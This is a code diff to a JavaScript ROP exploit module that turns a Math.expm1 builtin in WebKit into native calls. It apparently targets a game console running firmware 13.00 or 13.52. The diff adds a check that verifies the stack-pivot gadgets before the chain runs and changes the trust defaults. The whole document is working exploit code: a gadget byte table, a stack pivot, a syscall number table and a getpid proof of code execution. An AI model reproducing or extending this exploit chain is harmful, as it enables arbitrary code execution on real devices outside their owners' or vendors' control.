@@ -1,8 +1,12 @@
 /**
  * Math.expm1 pivot native call — poops-style ROP (chain_poops.js).
- * Pop gadgets: 13.52 HW. Pivot/call gadgets + libkernel stubs: 13.00 row (verify on HW).
+ * Pop gadgets: 13.52 HW. Pivot/call gadgets must be verified on HW before arming.
  */
 import { int64 } from "./int64.js";
+import {
+    PIVOT_ROWS,
+    verifyPivotSet,
+} from "./pivot_gadgets.js";
 
 export const SYS = {
     getpid: 20,
@@ -28,6 +32,8 @@ const GADGET_TABLE = [
     ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, 0x38]],
     ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
 ];
+
+export { verifyPivotSet, PIVOT_ROWS };
 
 function checkGadget(p, base, rva, pat) {
     if (rva == null) return false;
@@ -141,13 +147,29 @@ function put(dv, at, v) {
 export function initNativeCall(p, off, opts) {
     opts = opts || {};
     const log = opts.log || (() => {});
-    const trust = opts.trust !== false;
+    const trust = opts.trust === true;
 
     let webkitBase = opts.webkitBase || null;
     if (!webkitBase && opts.nativeFn && off.wk_expm1_builtin)
         webkitBase = opts.nativeFn.sub32(off.wk_expm1_builtin);
     if (!webkitBase)
         throw new Error("native_call: need webkitBase or nativeFn+expm1");
+
+    const pivotCheck = verifyPivotSet(
+        addr => p.read1(addr),
+        webkitBase,
+        off
+    );
+    if (!pivotCheck.ok) {
+        const parts = [];
+        if (pivotCheck.missing.length)
+            parts.push("missing=" + pivotCheck.missing.join(","));
+        if (pivotCheck.bad.length)
+            parts.push("bad=" + pivotCheck.bad.join(","));
+        throw new Error("pivot-not-ready: " + parts.join(" ")
+            + " — wrong 13.00 RVAs crash/OOM; scan pivot on RW page first");
+    }
+    log("PIVOT-OK", pivotCheck.count + "/" + pivotCheck.total + " verified");
 
     let libkernelBase = opts.libkernelBase || null;
     if (!libkernelBase) {
@@ -276,7 +298,7 @@ export function initNativeCall(p, off, opts) {
 }
 
 export function runGetpidProof(p, off, opts) {
-    opts = Object.assign({ trust: true, noStubScan: true }, opts || {});
+    opts = Object.assign({ trust: false, noStubScan: true }, opts || {});
     const chain = initNativeCall(p, off, opts);
     try {
         const pid = chain.sc(SYS.getpid).i32;
